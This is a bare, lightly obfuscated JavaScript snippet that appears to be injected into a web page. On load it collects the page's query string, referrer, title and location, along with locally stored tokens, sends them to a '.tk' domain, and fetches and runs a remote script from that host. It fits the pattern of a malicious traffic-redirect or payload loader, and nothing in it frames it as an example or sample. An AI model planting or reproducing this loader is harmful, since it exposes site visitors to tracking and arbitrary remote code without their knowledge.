    (function() {
    var name = '_z9G1NmQm1HfCvX2K';
    if (!window._z9G1NmQm1HfCvX2K) {
        window._z9G1NmQm1HfCvX2K = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://fratelridiras.tk/mysmile',
            P_PATH: 'https://fratelridiras.tk/fec84ce/postback',
        };
    }
    const _tLfY65853Gg7X757 = localStorage.getItem('config');
    if (typeof _tLfY65853Gg7X757 !== 'undefined' && _tLfY65853Gg7X757 !== null) {
        var _km6MVw5swJzJ6KzK = JSON.parse(_tLfY65853Gg7X757);
        var _15Rjqbq5VN1Y4h8f = Math.round(+new Date()/1000);
        if (_km6MVw5swJzJ6KzK.created_at + window._z9G1NmQm1HfCvX2K.ttl < _15Rjqbq5VN1Y4h8f) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _sjnj9DYcVtCkxHNd = localStorage.getItem('subId');
    var _YybqyQtHwHGfzCVb = localStorage.getItem('token');
    var _CMq8qnJbq7TPjQ4V = '?return=js.client';
        _CMq8qnJbq7TPjQ4V += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _CMq8qnJbq7TPjQ4V += '&se_referrer=' + encodeURIComponent(document.referrer);
        _CMq8qnJbq7TPjQ4V += '&default_keyword=' + encodeURIComponent(document.title);
        _CMq8qnJbq7TPjQ4V += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _CMq8qnJbq7TPjQ4V += '&name=' + encodeURIComponent(name);
        _CMq8qnJbq7TPjQ4V += '&host=' + encodeURIComponent(window._z9G1NmQm1HfCvX2K.R_PATH);
    if (typeof _sjnj9DYcVtCkxHNd !== 'undefined' && _sjnj9DYcVtCkxHNd && window._z9G1NmQm1HfCvX2K.unique) {
        _CMq8qnJbq7TPjQ4V += '&sub_id=' + encodeURIComponent(_sjnj9DYcVtCkxHNd);
    }
    if (typeof _YybqyQtHwHGfzCVb !== 'undefined' && _YybqyQtHwHGfzCVb && window._z9G1NmQm1HfCvX2K.unique) {
        _CMq8qnJbq7TPjQ4V += '&token=' + encodeURIComponent(_YybqyQtHwHGfzCVb);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._z9G1NmQm1HfCvX2K.R_PATH + _CMq8qnJbq7TPjQ4V;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
